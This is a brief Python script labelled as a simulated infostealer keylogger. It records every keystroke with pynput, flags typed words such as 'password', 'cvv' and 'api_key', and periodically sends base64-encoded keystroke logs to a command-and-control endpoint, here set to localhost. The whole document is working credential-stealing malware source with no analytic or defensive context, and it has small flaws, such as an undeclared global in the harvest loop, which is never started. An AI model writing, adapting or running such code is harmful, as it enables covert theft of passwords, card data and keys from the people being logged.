# Simulated infostealer keylogger
import threading, base64, requests
from pynput import keyboard

BUFFER = ""
C2 = "http://127.0.0.1:8443/exfil"

def on_press(key):
    global BUFFER
    try:
        BUFFER += key.char
    except AttributeError:
        BUFFER += " "
    for word in ("password", "cvv", "api_key"):
        if word in BUFFER.lower():
            requests.post(C2, data={"cred_hit": word})

def harvest():
    while True:
        if BUFFER:
            blob = base64.b64encode(BUFFER.encode()).decode()
            requests.post(C2, data={"keys": blob})
            BUFFER = ""
        threading.Event().wait(15)

listener = keyboard.Listener(on_press=on_press)
listener.start()
